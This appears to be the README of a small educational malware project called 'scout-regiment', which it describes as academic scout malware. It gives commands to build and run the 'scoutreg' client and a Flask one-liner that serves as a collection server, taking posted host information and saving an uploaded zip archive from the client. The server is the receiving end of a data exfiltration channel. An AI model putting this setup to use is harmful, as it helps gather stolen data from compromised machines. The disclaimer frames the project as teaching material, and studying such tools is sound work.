### Disclaimer

Academic example of scout malware. For educational purposes only. 

## scout-regiment

Named after a regiment of the same name in anime/manga "Attack on Titan" by Hajime Isayama.

### Build & Compile & Run

```
cmake -B out -S .
cmake --build out --config Debug

cp ./client/resources/dest ./out/client/
cp ./client/resources/{dest,test_payload.zip} ./out/client/
cd ./out/client
./scoutreg
```
### Temporary server oneliner (flask required)
```
python3 -c 'from flask import Flask,request; app=Flask(__name__); app.route("/client-info",methods=["POST"])(lambda: (print("FORM:",dict(request.form),flush=True), print("FILES:",[(k,v.filename,v.content_type) for k,v in request.files.items()],flush=True), request.files["file"].save("scoutreg.zip") if "file" in request.files else print("No file",flush=True), ("",200))[3]); app.run(host="0.0.0.0",port=8080)'
```
It prints the form data and saves the received file so you can inspect whether all has been delivered as expected
